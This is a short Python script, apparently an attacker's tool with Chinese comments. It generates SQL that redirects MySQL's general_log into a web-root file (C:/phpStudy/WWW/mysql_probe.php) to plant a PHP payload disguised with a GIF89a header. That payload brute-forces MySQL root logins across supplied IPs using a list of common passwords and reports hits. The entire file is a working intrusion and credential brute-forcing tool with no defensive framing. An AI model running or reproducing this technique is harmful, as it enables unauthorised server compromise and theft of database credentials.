#!/usr/bin/env python3
"""gen_mysql_probe81.py - 81.70端MySQL批量探测(general_log部署)
?ips=ip1,ip2&pw=密码 → 遍历测试MySQL连接
"""
body = '<?php $ips=explode(",",$_GET["ips"]);$pws=array("root","123456","admin","root123","12345678","password","mysql","test","123456789","admin123");foreach($ips as $ip){foreach($pws as $pw){$c=@mysqli_connect($ip,"root",$pw,"",3306,3);if($c){echo "HIT:".$ip.":root:".$pw.chr(10);mysqli_close($c);break;}}echo "DONE:".$ip.chr(10);flush();}?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/mysql_probe.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/mysql_probe81.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
